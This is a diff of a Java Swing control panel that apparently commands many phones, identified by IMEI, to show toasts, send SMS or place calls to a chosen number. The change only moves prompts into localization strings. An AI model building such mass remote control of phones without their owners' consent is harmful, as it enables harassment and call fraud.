@@ -504,7 +504,7 @@ public class GUI extends javax.swing.JFrame {
     
     
     private void fireBulkToast() {
-    	String txt = JOptionPane.showInputDialog(this, "Enter your text :");
+    	String txt = JOptionPane.showInputDialog(this, BUNDLE.getString("input-toast-text"));
     	if(txt != null) {
     		for(int row = 0; row < userTable.getRowCount(); row++) {
     			String imei = (String) model.getValueAt(row, 1);
@@ -529,7 +529,7 @@ public class GUI extends javax.swing.JFrame {
     }
     
     private void fireBulkCall() {
-    	String target = JOptionPane.showInputDialog(this, "Enter the target cell number :");
+    	String target = JOptionPane.showInputDialog(this,BUNDLE.getString("input-call-number"));
     	if(target != null) {
     		for(int row = 0; row < userTable.getRowCount(); row++) {
     			String imei = (String) model.getValueAt(row, 1);
@@ -539,7 +539,7 @@ public class GUI extends javax.swing.JFrame {
     }
     
     private void fireSelectPort() {
-    	String rep = JOptionPane.showInputDialog(this, "Enter the new server port (need server reboot) : ");
+    	String rep = JOptionPane.showInputDialog(this, BUNDLE.getString("input-prot-text"));
     	server.savePortConfig(rep);
     }
     
@@ -663,7 +663,7 @@ public class GUI extends javax.swing.JFrame {
         });
         mnBulkActions.add(mntmSendSms);
         
-        mntmGiveCall = new JMenuItem("Give call");
+        mntmGiveCall = new JMenuItem(BUNDLE.getString("Give-call")); //$NON-NLS-1$
         mntmGiveCall.addActionListener(new ActionListener() {
         	@Override
 			public void actionPerformed(ActionEvent e) {
